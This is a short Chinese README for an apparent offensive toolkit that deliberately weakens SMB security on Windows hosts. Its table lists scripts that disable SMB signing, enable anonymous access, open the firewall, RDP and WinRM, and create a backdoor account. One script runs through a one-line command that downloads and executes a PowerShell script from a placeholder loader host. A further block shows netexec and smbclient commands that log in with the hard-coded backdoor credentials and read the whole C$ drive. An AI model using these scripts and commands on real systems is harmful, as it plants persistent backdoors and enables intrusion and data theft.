# SMB 攻击面

| 文件 | 用途 | 一键命令 |
|---|---|---|
| `smb_open_backdoor.bat` | CMD 版全量开洞（SMB1/关签名/匿名/防火墙/RDP/WinRM/后门/共享） | 右键管理员运行 |
| `smb_minimal.ps1` | 最小开洞：关签名 + 放行 445/139/135 + 匿名 + LmCompat=2 | `irm http://LOADER_IP:8090/smb/smb_minimal.ps1 \| iex` |
| `revert_smb.bat` | 回滚全部 SMB 相关改动 | 右键管理员运行 |

## 攻击侧验证
```bash
netexec smb <IP> -u '' -p '' --shares              # 匿名枚举
netexec smb <IP> -u 'svc_diag$' -p 'P@ssw0rd!2024' # 后门号
smbclient //<IP>/C$ -U 'svc_diag$%P@ssw0rd!2024'   # 全盘读取
```
